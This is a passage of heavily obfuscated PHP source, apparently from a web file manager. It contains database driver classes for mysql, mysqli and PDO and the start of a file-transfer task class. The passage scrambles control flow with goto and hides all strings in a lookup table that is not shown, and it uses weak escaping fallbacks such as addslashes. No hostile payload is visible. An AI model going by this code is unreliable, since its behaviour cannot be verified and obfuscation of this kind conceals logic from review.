$FÖ =& $_SERVER[̉]; if (0 === stripos($d, $FÖ[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto bԈ; f̈: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto D΋; D΋: } public function execute($Bܘ) { goto F߉; fГ숹: think_status($E[20]); $Eӻ = mysql_query($Bܘ, $this->_linkID); $this->debug(); goto C; dë: $this->queryStr = $Bܘ; if ($this->queryID) { $this->free(); } think_action_status($E[21], 1); goto fГ숹; C: if (!1 === $Eӻ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto aХ㜟; F߉: $E =& $_SERVER[̉]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dë; aХ㜟: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[̉][853], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D؃ = mysql_query($_SERVER[̉][854], $this->_linkID); $this->transTimes = 0; if (!$D؃) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $A = mysql_query($_SERVER[̉][855], $this->_linkID); $this->transTimes = 0; if (!$A) { $this->error(); return !1; } } return !0; } private function getAll() { $f־ = array(); if ($this->numRows > 0) { while ($Å = mysql_fetch_assoc($this->queryID)) { $f־[] = $Å; } mysql_data_seek($this->queryID, 0); } return $f־; } public function getFields($F箍ޟ) { $DȘ =& $_SERVER[̉]; $F͉ = $this->query($DȘ[856] . $this->parseKey($F箍ޟ)); $Aҳĳ = array(); if ($F͉) { foreach ($F͉ as $bݬ => $eՐ) { $Aҳĳ[$eՐ[$DȘ[27]]] = array($DȘ[28] => $eՐ[$DȘ[27]], $DȘ[29] => $eՐ[$DȘ[30]], $DȘ[31] => (bool) (strtoupper($eՐ[$DȘ[32]]) === $DȘ[857]), $DȘ[34] => $eՐ[$DȘ[35]], $DȘ[36] => strtolower($eՐ[$DȘ[37]]) == $DȘ[38], $DȘ[39] => strtolower($eՐ[$DȘ[40]]) == $DȘ[41]); } } return $Aҳĳ; } public function getTables($eĈ = '') { $C̣ =& $_SERVER[̉]; if (!empty($eĈ)) { $FҐǧ = $C̣[858] . $eĈ . $C̣[859]; } else { $FҐǧ = $C̣[860]; } $fϳĲ = $this->query($FҐǧ); $dΫ = array(); foreach ($fϳĲ as $A׏ɂĞ => $A󩘍Ŋ) { $dΫ[$A׏ɂĞ] = current($A󩘍Ŋ); } return $dΫ; } public function replace($F, $BƝ = array()) { $bҋ =& $_SERVER[̉]; foreach ($F as $F֑ => $cԄȉ) { $c̤ = $this->parseValue($cԄȉ); if (is_scalar($c̤)) { $B[] = $c̤; $c[] = $this->parseKey($F֑); } } $c = $bҋ[861] . $this->parseTable($BƝ[$bҋ[277]]) . $bҋ[862] . implode($bҋ[47], $c) . $bҋ[863] . implode($bҋ[47], $B) . $bҋ[864]; return $this->execute($c); } public function insertAll($dƟ, $a = array(), $dه = false) { goto bժ; bժ: $fˮ =& $_SERVER[̉]; if (!is_array($dƟ[0])) { return !1; } $DҎֻ = array_keys($dƟ[0]); goto eү͗; eү͗: $Aꗏ = array(); foreach ($dƟ as $f) { $Cݻ = array(); foreach ($f as $B => $AÆ) { $AÆ = $this->parseValue($AÆ); if (is_scalar($AÆ)) { $Cݻ[] = $AÆ; } } $Aꗏ[] = $fˮ[258] . implode($fˮ[47], $Cݻ) . $fˮ[864]; } array_walk($DҎֻ, array($this, $fˮ[865])); goto F߷; F߷: $cˬ = ($dه ? $fˮ[866] : $fˮ[867]) . $fˮ[868] . $this->parseTable($a[$fˮ[277]]) . $fˮ[862] . implode($fˮ[47], $DҎֻ) . $fˮ[869] . implode($fˮ[47], $Aꗏ); return $this->execute($cˬ); goto fɋ; fɋ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $eܞ֢ =& $_SERVER[̉]; $this->error = mysql_errno() . $eܞ֢[4] . mysql_error($this->_linkID); if ($eܞ֢[33] != $this->queryStr) { $this->error .= LNG($eܞ֢[45]) . $this->queryStr; } think_trace($this->error, $eܞ֢[33], $eܞ֢[46]); return $this->error; } public function escapeString($D) { if ($this->_linkID) { return mysql_real_escape_string($D, $this->_linkID); } else { return mysql_escape_string($D); } } public function parseKey(&$Eːߡ, $A죎 = true) { $dǼ =& $_SERVER[̉]; if ($A죎) { $Eːߡ = $this->parseKeyCheck($Eːߡ); } if ($Eːߡ != $dǼ[182] && !preg_match($dǼ[870], $Eːߡ)) { $Eːߡ = $dǼ[382] . trim($Eːߡ, $dǼ[382]) . $dǼ[382]; } return $Eːߡ; } } class DbMysqli extends Db { public function __construct($F훍 = '') { $E =& $_SERVER[̉]; if (!extension_loaded($E[761])) { think_exception(think_lang($E[10]) . $E[871]); } if (!empty($F훍)) { $this->config = $F훍; if (empty($this->config[$E[13]])) { $this->config[$E[13]] = $E[33]; } } } public function connect($d܎ = '', $D = 0) { $a =& $_SERVER[̉]; if (!isset($this->linkID[$D])) { goto fՍ럜; fՍ럜: if (empty($d܎)) { $d܎ = $this->config; } $this->linkID[$D] = new mysqli($d܎[$a[845]], $d܎[$a[847]], $d܎[$a[848]], $d܎[$a[17]], $d܎[$a[846]] ? intval($d܎[$a[846]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto bلݽ; bلݽ: $D凓 = $this->linkID[$D]->server_version; $this->linkID[$D]->query($a[849] . think_config($a[850]) . $a[55]); if ($D凓 > $a[851]) { $this->linkID[$D]->query($a[852]); } goto fю; fю: $this->connected = !0; if (1 != think_config($a[18])) { unset($this->config); } goto F縗; F縗: } return $this->linkID[$D]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($a) { goto a; e: think_status($E[20]); $this->queryID = $this->_linkID->query($a); if ($this->_linkID->more_results()) { while (($bբ = $this->_linkID->next_result()) != NULL) { $bբ->free_result(); } } goto cֽ; E܈: $this->queryStr = $a; if ($this->queryID) { $this->free(); } think_action_status($E[19], 1); goto e; cֽ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto b; a: $E =& $_SERVER[̉]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E܈; b: } public function execute($aǤ) { goto bǬ; Cޝ: $this->queryStr = $aǤ; if ($this->queryID) { $this->free(); } think_action_status($Bӫ[21], 1); goto D; bǬ: $Bӫ =& $_SERVER[̉]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Cޝ; B꒫: if (!1 === $e޼) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto d; D: think_status($Bӫ[20]); $e޼ = $this->_linkID->query($aǤ); $this->debug(); goto B꒫; d: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CҰѽ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$CҰѽ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bѣ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Bѣ) { $this->error(); return !1; } } return !0; } private function getAll() { $c׶ = array(); if ($this->numRows > 0) { for ($dؖ = 0; $dؖ < $this->numRows; $dؖ++) { $c׶[$dؖ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $c׶; } public function getFields($B) { $Bá =& $_SERVER[̉]; $D = $this->query($Bá[856] . $this->parseKey($B)); $F޵ǄȜ = array(); if ($D) { foreach ($D as $AЋ̦ => $c) { $F޵ǄȜ[$c[$Bá[27]]] = array($Bá[28] => $c[$Bá[27]], $Bá[29] => $c[$Bá[30]], $Bá[31] => (bool) ($c[$Bá[32]] === $Bá[33]), $Bá[34] => $c[$Bá[35]], $Bá[36] => strtolower($c[$Bá[37]]) == $Bá[38], $Bá[39] => strtolower($c[$Bá[40]]) == $Bá[41]); } } return $F޵ǄȜ; } public function getTables($bĚč = '') { $eҹ =& $_SERVER[̉]; $b = !empty($bĚč) ? $eҹ[858] . $bĚč . $eҹ[859] : $eҹ[860]; $F = $this->query($b); $e׃ = array(); if ($F) { foreach ($F as $E => $bË) { $e׃[$E] = current($bË); } } return $e׃; } public function replace($b밸, $CԐۧ = array()) { $A =& $_SERVER[̉]; foreach ($b밸 as $dծ => $EǄ) { $d = $this->parseValue($EǄ); if (is_scalar($d)) { $A[] = $d; $Dʙ[] = $this->parseKey($dծ); } } $B = $A[861] . $this->parseTable($CԐۧ[$A[277]]) . $A[862] . implode($A[47], $Dʙ) . $A[863] . implode($A[47], $A) . $A[864]; return $this->execute($B); } public function insertAll($BӦƻ, $dƾ = array(), $Cʗ = false) { goto a; Fܰ: $e = array(); foreach ($BӦƻ as $Fһ) { $fȗ郐 = array(); foreach ($Fһ as $Aſ => $fۑǐ) { $fۑǐ = $this->parseValue($fۑǐ); if (is_scalar($fۑǐ)) { $fȗ郐[] = $fۑǐ; } } $e[] = $C쫉ؒ[258] . implode($C쫉ؒ[47], $fȗ郐) . $C쫉ؒ[864]; } array_walk($c, array($this, $C쫉ؒ[865])); goto Dշ; Dշ: $aԜ = $Cʗ ? $C쫉ؒ[866] : $C쫉ؒ[867]; $f = $aԜ . $C쫉ؒ[868] . $this->parseTable($dƾ[$C쫉ؒ[277]]) . $C쫉ؒ[862] . implode($C쫉ؒ[47], $c) . $C쫉ؒ[869] . implode($C쫉ؒ[47], $e); return $this->execute($f); goto A釯; a: $C쫉ؒ =& $_SERVER[̉]; if (!is_array($BӦƻ[0])) { return !1; } $c = array_keys($BӦƻ[0]); goto Fܰ; A釯: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $aŃؚ =& $_SERVER[̉]; $this->error = $this->_linkID->errno . $aŃؚ[4] . $this->_linkID->error; if ($aŃؚ[33] != $this->queryStr) { $this->error .= LNG($aŃؚ[45]) . $this->queryStr; } think_trace($this->error, $aŃؚ[33], $aŃؚ[46]); return $this->error; } public function escapeString($A) { if ($this->_linkID) { return $this->_linkID->real_escape_string($A); } else { return addslashes($A); } } public function parseKey(&$f㌏, $Eב = true) { $c򴼳 =& $_SERVER[̉]; if ($Eב) { $f㌏ = $this->parseKeyCheck($f㌏); } if ($f㌏ != $c򴼳[182] && !preg_match($c򴼳[870], $f㌏)) { $f㌏ = $c򴼳[382] . trim($f㌏, $c򴼳[382]) . $c򴼳[382]; } return $f㌏; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($C = '') { $aׂ =& $_SERVER[̉]; if (!class_exists($aׂ[872])) { think_exception(think_lang($aׂ[10]) . $aׂ[873]); } if (!empty($C)) { $this->config = $C; if (empty($this->config[$aׂ[13]])) { $this->config[$aׂ[13]] = array(); } } } public function connect($f޳ = '', $Aڻ = 0) { $Cҍ˛ =& $_SERVER[̉]; if (!isset($this->linkID[$Aڻ])) { goto C; C: if (1 != think_config($Cҍ˛[18])) { unset($this->config); } goto F⊆; f϶: try { $this->linkID[$Aڻ] = new PDO($f޳[$Cҍ˛[874]], $f޳[$Cҍ˛[847]], $f޳[$Cҍ˛[848]], $f޳[$Cҍ˛[13]]); } catch (PDOException $fٿ) { think_exception($fٿ->getMessage()); } $this->dbType = $this->_getDsnType($f޳[$Cҍ˛[874]]); if (in_array($this->dbType, array($Cҍ˛[875], $Cҍ˛[876], $Cҍ˛[877], $Cҍ˛[878]))) { think_exception($Cҍ˛[879] . $this->dbType . $Cҍ˛[880] . $this->dbType . $Cҍ˛[881]); } goto eЋɠ; eЋɠ: if (!$this->linkID[$Aڻ]) { think_exception($Cҍ˛[882]); } try { $this->linkID[$Aڻ]->exec($Cҍ˛[883] . think_config($Cҍ˛[850])); } catch (Exception $fٿ) { } $this->connected = !0; goto C; C: if (empty($f޳)) { $f޳ = $this->config; } $B = !empty($f޳[$Cҍ˛[13]][$Cҍ˛[14]]) ? $f޳[$Cҍ˛[13]][$Cҍ˛[14]] : $this->pconnect; if ($B) { $f޳[$Cҍ˛[13]][PDO::ATTR_PERSISTENT] = !0; } goto f϶; F⊆: } return $this->linkID[$Aڻ]; } public function free() { $this->PDOStatement = null; } public function query($b˿, $e𧍓 = array()) { goto E; fȟ: think_action_status($f뚅د[19], 1); think_status($f뚅د[20]); $this->PDOStatement = $this->_linkID->prepare($b˿); goto c; E: $f뚅د =& $_SERVER[̉]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto AЭ; A: if (!1 === $EҐ) { $this->error(); return !1; } else { return $this->getAll(); } goto Eޱ; AЭ: $this->queryStr = $b˿; if (!empty($e𧍓)) { $this->queryStr .= $f뚅د[884] . print_r($e𧍓, !0) . $f뚅د[885]; } if (!empty($this->PDOStatement)) { $this->free(); } goto fȟ; c: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $EҐ = $this->PDOStatement->execute($e𧍓); $this->debug(); goto A; Eޱ: } public function execute($d, $Fð = array()) { goto DЙ; A럦: if ($this->dbType == $E̓[878]) { if (preg_match($E̓[886], $this->queryStr, $F繒)) { $this->table = think_config($E̓[887]) . str_ireplace(think_config($E̓[888]), $E̓[375], $F繒[2]); $F̂ʕդ = (bool) $this->query($E̓[889] . strtoupper($this->table) . $E̓[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($E̓[21], 1); goto EƠ򲳿; DЙ: $E̓ =& $_SERVER[̉]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fَ̫; dȚ֪ɽ: $e = $this->PDOStatement->execute($Fð); $this->debug(); if (!1 === $e) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($F̂ʕդ || preg_match($E̓[890], $d)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto d; Fَ̫: $this->queryStr = $d; if (!empty($Fð)) { $this->queryStr .= $E̓[884] . print_r($Fð, !0) . $E̓[885]; } $F̂ʕդ = !1; goto A럦; EƠ򲳿: think_status($E̓[20]); $this->PDOStatement = $this->_linkID->prepare($d); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto dȚ֪ɽ; d: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BԒ = $this->_linkID->commit(); $this->transTimes = 0; if (!$BԒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Dϝ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Dϝ) { $this->error(); return !1; } } return !0; } private function getAll() { $F聆ք = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($F聆ք); return $F聆ք; } public function getFields($E񚑜) { goto a姎; Bص: return $A; goto A䡈; a姎: $A䰹 =& $_SERVER[̉]; $this->initConnect(!0); if (think_config($A䰹[891])) { $aם풑 = str_replace($A䰹[892], $E񚑜, think_config($A䰹[891])); } else { switch ($this->dbType) { case $A䰹[875]: case $A䰹[893]: $aם풑 = "\x53\x45\x4c\105\103\x54\40\40\x20\143\157\x6c\165\x6d\156\137\x6e\x61\x6d\145\40\x61\x73\40\x27\x4e\141\x6d\x65\47\54\x20\x20\40\144\141\x74\x61\137\x74\x79\x70\145\40\x61\163\40\47\x54\x79\160\x65\47\54\x20\40\x20\x63\x6f\x6c\165\x6d\156\x5f\x64\x65\146\141\165\x6c\164\x20\x61\163\40\47\x44\145\x66\141\x75\x6c\164\47\54\x20\x20\40\151\x73\x5f\156\165\x6c\x6c\x61\x62\154\145\40\141\x73\x20\x27\x4e\165\x6c\154\47\12\11\11\106\122\117\115\11\x69\x6e\146\x6f\162\x6d\x61\x74\151\x6f\156\x5f\x73\143\x68\145\x6d\x61\x2e\x74\x61\x62\x6c\145\x73\x20\x41\123\x20\x74\12\11\11\x4a\x4f\111\x4e\11\151\x6e\146\157\x72\x6d\141\x74\151\x6f\156\x5f\163\143\150\145\x6d\x61\x2e\143\x6f\x6c\x75\155\156\163\40\101\x53\x20\143\xa\11\x9\117\x4e\x20\40\x74\56\x74\x61\x62\154\x65\137\143\x61\x74\x61\x6c\x6f\x67\x20\x3d\40\143\56\x74\141\x62\x6c\x65\x5f\143\x61\x74\x61\154\x6f\x67\12\11\11\x41\116\104\x20\x74\56\x74\x61\142\154\x65\137\163\x63\x68\x65\x6d\x61\40\75\40\x63\x2e\164\141\x62\154\145\137\163\x63\x68\145\x6d\141\xa\x9\x9\x41\116\x44\x20\164\x2e\x74\141\142\154\145\x5f\x6e\141\155\x65\40\75\x20\x63\x2e\164\x61\x62\x6c\145\137\x6e\x61\x6d\145\12\x9\11\127\x48\x45\x52\x45\40\40\40\x74\x2e\164\141\142\154\x65\137\x6e\x61\x6d\x65\x20\75\x20\47{$E񚑜}\x27"; break; case $A䰹[894]: $aם풑 = $A䰹[895] . $E񚑜 . $A䰹[896]; break; case $A䰹[876]: case $A䰹[878]: $aם풑 = $A䰹[897] . $A䰹[898] . $A䰹[899] . strtoupper($E񚑜) . $A䰹[900] . strtoupper($E񚑜) . $A䰹[901]; break; case $A䰹[902]: $aם풑 = $A䰹[903] . $E񚑜 . $A䰹[904]; break; case $A䰹[877]: break; case $A䰹[905]: default: $aם풑 = $A䰹[906] . ($this->dbType == $A䰹[905] ? "\x60{$E񚑜}\x60" : $E񚑜); } } goto Bɞ; Bɞ: $Dկ = $this->query($aם풑); $A = array(); if ($Dկ) { foreach ($Dկ as $FՅߐ => $aڗ) { $aڗ = array_change_key_case($aڗ); $aڗ[$A䰹[28]] = isset($aڗ[$A䰹[28]]) ? $aڗ[$A䰹[28]] : $A䰹[375]; $aڗ[$A䰹[29]] = isset($aڗ[$A䰹[29]]) ? $aڗ[$A䰹[29]] : $A䰹[375]; $B몼ߑ = isset($aڗ[$A䰹[271]]) ? $aڗ[$A䰹[271]] : $aڗ[$A䰹[28]]; $A[$B몼ߑ] = array($A䰹[28] => $B몼ߑ, $A䰹[29] => $aڗ[$A䰹[29]], $A䰹[31] => (bool) (isset($aڗ[$A䰹[103]]) && $aڗ[$A䰹[103]] === $A䰹[33] || isset($aڗ[$A䰹[31]]) && $aڗ[$A䰹[31]] === $A䰹[33]), $A䰹[34] => isset($aڗ[$A䰹[34]]) ? $aڗ[$A䰹[34]] : (isset($aڗ[$A䰹[53]]) ? $aڗ[$A䰹[53]] : $A䰹[375]), $A䰹[36] => isset($aڗ[$A䰹[93]]) ? strtolower($aڗ[$A䰹[93]]) == $A䰹[38] : (isset($aڗ[$A䰹[54]]) ? $aڗ[$A䰹[54]] : !1), $A䰹[39] => isset($aڗ[$A䰹[907]]) ? strtolower($aڗ[$A䰹[907]]) == $A䰹[41] : (isset($aڗ[$A䰹[93]]) ? $aڗ[$A䰹[93]] : !1)); } } goto Bص; A䡈: } public function getTables($a̤÷ = '') { $ảό =& $_SERVER[̉]; if (think_config($ảό[908])) { $Eܥ = str_replace($ảό[909], $a̤÷, think_config($ảό[908])); } else { switch ($this->dbType) { case $ảό[876]: case $ảό[878]: $Eܥ = $ảό[910]; break; case $ảό[875]: case $ảό[893]: $Eܥ = $ảό[911]; break; case $ảό[902]: $Eܥ = $ảό[912]; break; case $ảό[877]: think_exception(think_lang($ảό[913]) . $ảό[914]); break; case $ảό[894]: $Eܥ = $ảό[42] . $ảό[43] . $ảό[44]; break; case $ảό[905]: default: if (!empty($a̤÷)) { $Eܥ = $ảό[858] . $a̤÷ . $ảό[859]; } else { $Eܥ = $ảό[860]; } } } $f = $this->query($Eܥ); $aƚ˟ = array(); foreach ($f as $b惘 => $Dꯃ) { $aƚ˟[$b惘] = current($Dꯃ); } return $aƚ˟; } protected function parseLimit($f샯ՠ) { $b =& $_SERVER[̉]; $AΑ = $b[33]; if (!empty($f샯ՠ)) { switch ($this->dbType) { case $b[902]: case $b[894]: $f샯ՠ = explode($b[47], $f샯ՠ); if (count($f샯ՠ) > 1) { $AΑ .= $b[48] . $f샯ՠ[1] . $b[49] . $f샯ՠ[0] . $b[50]; } else { $AΑ .= $b[48] . $f샯ՠ[0] . $b[50]; } break; case $b[875]: case $b[893]: break; case $b[877]: break; case $b[876]: case $b[878]: break; case $b[905]: default: $AΑ .= $b[48] . $f샯ՠ . $b[50]; } } return $AΑ; } public function parseKey(&$CͿ, $A = true) { $c =& $_SERVER[̉]; if ($A) { $CͿ = $this->parseKeyCheck($CͿ); } if ($this->dbType == $c[905]) { if ($CͿ != $c[182] && !preg_match($c[870], $CͿ)) { $CͿ = $c[382] . trim($CͿ, $c[382]) . $c[382]; } return $CͿ; } else { return parent::parseKey($CͿ, $A); } } public function close() { $this->_linkID = null; } public function error() { $Dɸ =& $_SERVER[̉]; if ($this->PDOStatement) { $a¥ = $this->PDOStatement->errorInfo(); $this->error = $a¥[1] . $Dɸ[4] . $a¥[2]; } else { $this->error = $Dɸ[33]; } if ($Dɸ[33] != $this->queryStr) { $this->error .= LNG($Dɸ[45]) . $this->queryStr; } think_trace($this->error, $Dɸ[33], $Dɸ[46]); return $this->error; } public function escapeString($aĻߛ) { $EЍ =& $_SERVER[̉]; switch ($this->dbType) { case $EЍ[902]: case $EЍ[875]: case $EЍ[893]: case $EЍ[905]: return addslashes($aĻߛ); case $EЍ[877]: case $EЍ[894]: case $EЍ[876]: case $EЍ[878]: return str_ireplace($EЍ[55], $EЍ[56], $aĻߛ); } } protected function parseValue($eá昹) { $d鴕 =& $_SERVER[̉]; if (is_string($eá昹)) { $Bѧ = strpos($eá昹, $d鴕[4]) === 0 && in_array($eá昹, array_keys($this->bind)); $eá昹 = $Bѧ ? $this->escapeString($eá昹) : $d鴕[915] . $this->escapeString($eá昹) . $d鴕[915]; } elseif (isset($eá昹[0]) && is_string($eá昹[0]) && strtolower($eá昹[0]) == $d鴕[295]) { $eá昹 = $this->escapeString($eá昹[1]); } elseif (is_array($eá昹)) { $eá昹 = array_map(array($this, $d鴕[916]), $eá昹); } elseif (is_bool($eá昹)) { $eá昹 = $eá昹 ? $d鴕[87] : $d鴕[191]; } elseif (is_null($eá昹)) { $eá昹 = $d鴕[103]; } return $eá昹; } public function getLastInsertId() { $e߻º =& $_SERVER[̉]; switch ($this->dbType) { case $e߻º[902]: case $e߻º[894]: case $e߻º[875]: case $e߻º[893]: case $e߻º[877]: case $e߻º[905]: return $this->_linkID->lastInsertId(); case $e߻º[876]: case $e߻º[878]: $fݬؚ = $this->table; $f菆 = $this->query("\x53\x45\114\x45\103\124\40{$fݬؚ}\56\143\165\x72\x72\166\141\x6c\40\143\165\162\x72\166\x61\154\x20\106\x52\117\x4d\40\144\165\141\x6c"); return $f菆 ? $f菆[0][$e߻º[917]] : 0; } } } goto fʲ; f߂: class TaskFileTransfer extends Task { protected function startAfter() { goto bŋȄ; aט: Hook::bind($A˗ç[566], array($this, $A˗ç[1560])); Hook::bind($A˗ç[567], array($this, $A˗ç[1561])); Hook::bind($A˗ç[569], array($this, $A˗ç[1562])); goto e͋; C§Ӊ: Hook::bind($A˗ç[539], array($this, $A˗ç[1563])); Hook::bind($A˗ç[541], array($this, $A˗ç[1563])); Hook::bind($A˗ç[543], array($this, $A˗ç[1563])); goto cЂ; AЎ茓: $dِ[$A˗ç[1022]] = $A˗ç[33]; $dِ[$A˗ç[1577]] = $A˗ç[33]; $dِ[$A˗ç[1578]] = 0; goto Fˎ; cЂ: Hook::bind($A˗ç[1564], array($this, $A˗ç[1565])); Hook::bind($A˗ç[559], array($this, $A˗ç[1566])); $this->sourceModelCopyFlag = !1; goto aܖу; e͋: Hook::bind($A˗ç[570], array($this, $A˗ç[1562])); Hook::bind($A˗ç[537], array($this, $A˗ç[1563])); Hook::bind($A˗ç[534], array($this, $A˗ç[1563])); goto C§Ӊ; bŋȄ: $A˗ç =& $_SERVER[̉]; $dِ =& $this->task; $this->sourceCopyFolder = !1; goto a釆; B􍵝ȅ: $dِ[$A˗ç[1573]] = LNG($A˗ç[1574]); $dِ[$A˗ç[1575]] = 0; $dِ[$A˗ç[1576]] = 0; goto AЎ茓; a釆: Hook::bind($A˗ç[1555], array($this, $A˗ç[1556])); Hook::bind($A˗ç[1109], array($this, $A˗ç[1557])); Hook::bind($A˗ç[1558], array($this, $A˗ç[1559])); goto aט; aܖу: Hook::bind($A˗ç[1567], array($this, $A˗ç[1568])); Hook::bind($A˗ç[1569], array($this, $A˗ç[1570])); Hook::bind($A˗ç[1571], array($this, $A˗ç[1572])); goto B􍵝ȅ; Fˎ: $dِ[$A˗ç[1579]] = 0; $dِ[$A˗ç[1580]] = 0; if (!$dِ[$A˗ç[1435]]) { $dِ[$A˗ç[1435]] = LNG($A˗ç[1581]); } goto bܨť; bܨť: } protected function endAfter() { goto dܖ; b: Hook::unbind($eǋ[1567], array($this, $eǋ[1568])); Hook::unbind($eǋ[1569], array($this, $eǋ[1570])); Hook::unbind($eǋ[1571], array($this, $eǋ[1572])); goto f՚; fۙ: Hook::unbind($eǋ[1558], array($this, $eǋ[1559])); Hook::unbind($eǋ[566], array($this, $eǋ[1560])); Hook::unbind($eǋ[567], array($this, $eǋ[1561])); goto fΕ; fΕ: Hook::unbind($eǋ[569], array($this, $eǋ[1562])); Hook::unbind($eǋ[570], array($this, $eǋ[1562])); Hook::unbind($eǋ[537], array($this, $eǋ[1563])); goto FӃ; dܖ: $eǋ =& $_SERVER[̉]; Hook::unbind($eǋ[1555], array($this, $eǋ[1556])); Hook::unbind($eǋ[1109], array($this, $eǋ[1557])); goto fۙ; FӃ: Hook::unbind($eǋ[534], array($this, $eǋ[1563])); Hook::unbind($eǋ[539], array($this, $eǋ[1563])); Hook::unbind($eǋ[541], array($this, $eǋ[1563])); goto a܇; a܇: Hook::unbind($eǋ[543], array($this, $eǋ[1563])); Hook::unbind($eǋ[1564], array($this, $eǋ[1565])); Hook::unbind($eǋ[559], array($this, $eǋ[1566])); goto b; f՚: } public function copyMoveStart($d䅍, $F, $E, $Fϛ) { goto c; Fɣ΍: $e̽ڱ[$c־ڂ[1583]] = KodIO::transferType($d䅍, $E); $this->update(); goto Aۺ; EΧ: if (substr($F, 0, strlen($Aپ)) == $Aپ) { return; } if (substr($Fϛ, 0, strlen($Aپ)) == $Aپ) { return; } $e̽ڱ =& $this->task; goto Fɣ΍; c: $c־ڂ =& $_SERVER[̉]; self::log($c־ڂ[1582] . $F . $c־ڂ[67] . $Fϛ); $Aپ = rtrim(TEMP_FILES, $c־ڂ[8]); goto EΧ; Aۺ: } public function updateAfter() { goto eܓ; eܓ: $DѶ܅ =& $_SERVER[̉]; $A֌ =& $this->task; if (!$A֌[$DѶ܅[726]]) { return; } goto Aƾ; Aƾ: if ($this->sourceModelCopyFlag) { return; } if ($A֌[$DѶ܅[1583]] == $DѶ܅[1182]) { return; } if ($A֌[$DѶ܅[1583]] == $DѶ܅[1093] || $A֌[$DѶ܅[1583]] == $DѶ܅[107]) { if ($A֌[$DѶ܅[1577]]) { $A֌[$DѶ܅[1580]] = $A֌[$DѶ܅[1579]] + $A֌[$DѶ܅[1576]]; } } else { if ($A֌[$DѶ܅[1583]] == $DѶ܅[1183]) { if ($A֌[$DѶ܅[1577]] == $DѶ܅[1093]) { $A֌[$DѶ܅[1580]] = $A֌[$DѶ܅[1579]] + $A֌[$DѶ܅[1576]] * 0.5; } else { if ($A֌[$DѶ܅[1577]] == $DѶ܅[107]) { $A֌[$DѶ܅[1580]] = $A֌[$DѶ܅[1579]] + $A֌[$DѶ܅[1575]] * 0.5 + $A֌[$DѶ܅[1576]] * 0.5; } } } } goto b¶; b¶: $A֌[$DѶ܅[1532]] = $A֌[$DѶ܅[1580]] / $A֌[$DѶ܅[726]]; if ($A֌[$DѶ܅[1532]] > 0) { $A = timeFloat() - $A֌[$DѶ܅[752]] - $A֌[$DѶ܅[1535]]; $A֌[$DѶ܅[1536]] = $A * (1 - $A֌[$DѶ܅[1532]]) / $A֌[$DѶ܅[1532]]; } goto AЈ; AЈ: } public function addPath($D򃼏) { goto eÅ; aΈ: $E뎞 = IO::infoWithChildren($D򃼏); $Eψ = $eԉ[$b[1584]] ? $eԉ[$b[1584]][$b[1585]] : 0; $eԉ[$b[1584]] = array($b[1585] => $Eψ + 1, $b[413] => $E뎞[$b[28]], $b[76] => $E뎞[$b[76]], $b[495] => $E뎞[$b[495]] ? $E뎞[$b[495]] : $E뎞[$b[76]]); goto aݫ; aݫ: if ($E뎞[$b[29]] == $b[193]) { $eԉ[$b[1020]] += 1; } else { $eԉ[$b[1020]] += $E뎞[$b[81]][$b[79]]; if ($E뎞[$b[395]]) { $eԉ[$b[1020]] += $E뎞[$b[81]][$b[80]] + 1; } } $eԉ[$b[726]] += $E뎞[$b[78]]; $this->update(); goto c; eÅ: $b =& $_SERVER[̉]; if (!$D򃼏) { return; } $eԉ =& $this->task; goto aΈ; c: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($A۹) { $c䤋 =& $_SERVER[̉]; $e睄Ȅ =& $this->task; $e睄Ȅ[$c䤋[1573]] = $A۹[$c䤋[28]]; $e睄Ȅ[$c䤋[1022]] = $A۹[$c䤋[28]]; $this->update(); } public function copyFileStart($FǄа, $fע, $cŃ, $F͔, $b􏡻, $B޴) { goto BÖ; B顽: $b[$F[1573]] = $Aಉ; $b[$F[1575]] = (int) $FǄа->size($fע); $b[$F[1576]] = 0; goto dܐ; BÖ: $F =& 